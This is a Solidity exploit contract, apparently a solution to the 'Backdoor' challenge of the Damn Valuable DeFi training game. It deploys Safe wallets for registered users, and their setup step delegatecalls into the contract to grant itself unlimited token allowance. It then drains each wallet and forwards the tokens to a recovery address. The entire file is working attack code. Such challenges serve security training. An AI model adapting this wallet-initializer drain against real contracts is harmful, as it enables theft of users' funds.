// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";

contract BackdoorExploit {
    Safe private immutable _singletonCopy;
    SafeProxyFactory private immutable _walletFactory;

    DamnValuableToken private immutable _token;
    WalletRegistry private immutable _walletRegistry;

    address[] private _users;
    address private immutable _recovery;

    constructor(
        address payable singletonCopy,
        address walletFactory,
        address walletRegistry,
        address recovery,
        address token,
        address[] memory users
    ) {
        _token = DamnValuableToken(token);
        _singletonCopy = Safe(singletonCopy);
        _walletFactory = SafeProxyFactory(walletFactory);
        _walletRegistry = WalletRegistry(walletRegistry);

        _users = users;
        _recovery = recovery;
    }

    function run() external {
        for (uint256 i = 0; i < _users.length; ++i) {
            address[] memory owners = new address[](1);
            owners[0] = _users[i];

            // setup call to approve this exploit contract
            bytes memory data = abi.encodeCall(this.approve, (address(this)));

            // Safe initializer data
            bytes memory initializer = abi.encodeWithSelector(
                Safe.setup.selector, owners, 1, address(this), data, address(0), address(0), 0, payable(address(0))
            );

            // create the new SafeProxy with callback
            SafeProxy proxy =
                _walletFactory.createProxyWithCallback(address(_singletonCopy), initializer, 0, _walletRegistry);

            _token.transferFrom(address(proxy), address(this), _token.balanceOf(address(proxy)));
        }

        _token.transfer(_recovery, _token.balanceOf(address(this)));
    }

    function approve(address spender) external {
        _token.approve(spender, type(uint256).max);
    }
}
